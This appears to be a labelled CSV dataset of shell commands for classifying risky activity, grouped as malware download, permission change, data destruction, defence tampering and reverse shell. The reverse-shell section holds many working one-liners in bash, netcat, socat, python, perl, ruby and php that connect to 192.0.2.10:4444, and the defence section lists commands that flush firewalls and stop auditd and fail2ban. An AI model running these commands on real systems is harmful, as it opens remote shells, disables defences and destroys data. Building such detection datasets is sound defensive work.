command,label
wget -O /tmp/sample.bin https://example.com/sample.bin,Malware Download
curl -o /tmp/archive.tar.gz http://example.com/archive.tar.gz,Malware Download
wget https://example.org/tool.zip,Malware Download
curl -L -o /tmp/tool.zip https://example.org/tool.zip,Malware Download
wget --no-check-certificate https://example.com/file,Malware Download
curl -k https://example.com/payload.bin -o /tmp/payload.bin,Malware Download
wget http://example.net/test.sh -O /tmp/test.sh,Malware Download
curl http://example.net/test.bin -o /tmp/test.bin,Malware Download
wget -qO /tmp/sample https://example.org/sample,Malware Download
curl -sS https://example.org/file -o /tmp/file,Malware Download
wget --content-disposition https://example.com/file.bin,Malware Download
curl -O http://example.net/archive.zip,Malware Download
wget https://example.com/a/b/c.bin,Malware Download
curl -L http://example.com/download?id=1 -o /tmp/download.bin,Malware Download
wget -O /tmp/script.sh http://example.org/script.sh,Malware Download
curl -o /tmp/data.bin https://example.org/data.bin,Malware Download
wget -q https://example.net/package.tar.gz,Malware Download
chmod 600 file.txt,Permission Modification
chmod 644 config.txt,Permission Modification
chmod 755 script.sh,Permission Modification
chmod +x script.sh,Permission Modification
chmod -x script.sh,Permission Modification
chmod 700 private.sh,Permission Modification
chmod 777 shared.txt,Permission Modification
chmod 640 secrets.txt,Permission Modification
chmod 400 key.txt,Permission Modification
chmod 664 report.txt,Permission Modification
chmod u+x run.sh,Permission Modification
chmod g+w file.txt,Permission Modification
chmod o-r file.txt,Permission Modification
chmod a+r file.txt,Permission Modification
chmod u=rw file.txt,Permission Modification
chmod 750 deploy.sh,Permission Modification
chmod 751 service.sh,Permission Modification
chmod 500 backup.sh,Permission Modification
chmod 2755 shared_dir,Permission Modification
chmod 1777 /tmp/example,Permission Modification
chmod 755 /usr/local/bin/tool,Permission Modification
chmod 600 ~/.config/example,Permission Modification
chmod 644 README.txt,Permission Modification
chmod 700 ~/.ssh/example,Permission Modification
chmod 444 public.txt,Permission Modification
rm file.txt,Data Destruction
rm -f file.txt,Data Destruction
rm -rf /tmp/testdir,Data Destruction
rm -r old_directory,Data Destruction
rm -rf /tmp/cache/*,Data Destruction
shred file.txt,Data Destruction
shred -u secret.txt,Data Destruction
shred -n 3 sensitive.txt,Data Destruction
truncate -s 0 logfile.txt,Data Destruction
> logfile.txt,Data Destruction
cat /dev/null > logfile.txt,Data Destruction
dd if=/dev/zero of=/tmp/testfile bs=1M count=10,Data Destruction
dd if=/dev/zero of=data.img bs=512 count=100,Data Destruction
rm -f /tmp/temp1 /tmp/temp2,Data Destruction
rm -rf build/,Data Destruction
rm -rf cache/,Data Destruction
rm old.log,Data Destruction
rm -f *.tmp,Data Destruction
shred -z -u secret.txt,Data Destruction
truncate --size 0 history.log,Data Destruction
rm -rf /tmp/session,Data Destruction
rm -rf ./old_data,Data Destruction
rm -f backup.tmp,Data Destruction
shred -u credentials.txt,Data Destruction
cat /dev/null > history.log,Data Destruction
ufw disable,Defense Tampering
ufw delete allow 22/tcp,Defense Tampering
ufw reset,Defense Tampering
iptables -F,Defense Tampering
iptables -X,Defense Tampering
iptables -t nat -F,Defense Tampering
iptables -D INPUT -p tcp --dport 22 -j ACCEPT,Defense Tampering
iptables -A INPUT -j DROP,Defense Tampering
iptables -A OUTPUT -j DROP,Defense Tampering
iptables -t nat -A POSTROUTING -j MASQUERADE,Defense Tampering
systemctl stop firewalld,Defense Tampering
systemctl disable firewalld,Defense Tampering
systemctl stop ufw,Defense Tampering
systemctl disable ufw,Defense Tampering
service firewalld stop,Defense Tampering
service ufw stop,Defense Tampering
killall -9 auditd,Defense Tampering
systemctl stop auditd,Defense Tampering
systemctl disable auditd,Defense Tampering
systemctl stop apparmor,Defense Tampering
systemctl disable apparmor,Defense Tampering
systemctl stop fail2ban,Defense Tampering
systemctl disable fail2ban,Defense Tampering
service fail2ban stop,Defense Tampering
ufw deny 22/tcp,Defense Tampering
bash -i >& /dev/tcp/192.0.2.10/4444 0>&1,Reverse Shell
/bin/bash -i >& /dev/tcp/192.0.2.10/4444 0>&1,Reverse Shell
sh -i >& /dev/tcp/192.0.2.10/4444 0>&1,Reverse Shell
0<&196;exec 196<>/dev/tcp/192.0.2.10/4444; sh <&196 >&196 2>&196,Reverse Shell
bash -c 'bash -i >& /dev/tcp/192.0.2.10/4444 0>&1',Reverse Shell
"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((""192.0.2.10"",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")'",Reverse Shell
"python -c 'import socket,os,pty;s=socket.socket();s.connect((""192.0.2.10"",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")'",Reverse Shell
nc 192.0.2.10 4444 -e /bin/sh,Reverse Shell
nc -e /bin/bash 192.0.2.10 4444,Reverse Shell
ncat 192.0.2.10 4444 -e /bin/sh,Reverse Shell
socat TCP:192.0.2.10:4444 EXEC:/bin/sh,Reverse Shell
socat TCP:192.0.2.10:4444 EXEC:'/bin/bash -li',Reverse Shell
"perl -e 'use Socket;$i=""192.0.2.10"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,""<&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",Reverse Shell
"ruby -rsocket -e 'f=TCPSocket.open(""192.0.2.10"",4444).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",Reverse Shell
"php -r '$s=fsockopen(""192.0.2.10"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'",Reverse Shell
busybox nc 192.0.2.10 4444 -e /bin/sh,Reverse Shell
mkfifo /tmp/p; nc 192.0.2.10 4444 < /tmp/p | /bin/sh > /tmp/p,Reverse Shell
telnet 192.0.2.10 4444 | /bin/sh | telnet 192.0.2.10 4445,Reverse Shell
bash -c 'exec 5<>/dev/tcp/192.0.2.10/4444;cat <&5 | /bin/sh >&5 2>&5',Reverse Shell
/bin/sh -c 'sh -i >& /dev/tcp/192.0.2.10/4444 0>&1',Reverse Shell
"python3 -c 'import socket; s=socket.create_connection((""192.0.2.10"",4444)); s.send(b""shell\n"")'",Reverse Shell
"perl -MSocket -e 'socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in(4444,inet_aton(""192.0.2.10"")));exec(""/bin/sh"")'",Reverse Shell
"ruby -rsocket -e 'TCPSocket.new(""192.0.2.10"",4444)'",Reverse Shell
ncat --udp 192.0.2.10 4444 -e /bin/sh,Reverse Shell
"socat TCP:192.0.2.10:4444 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",Reverse Shell
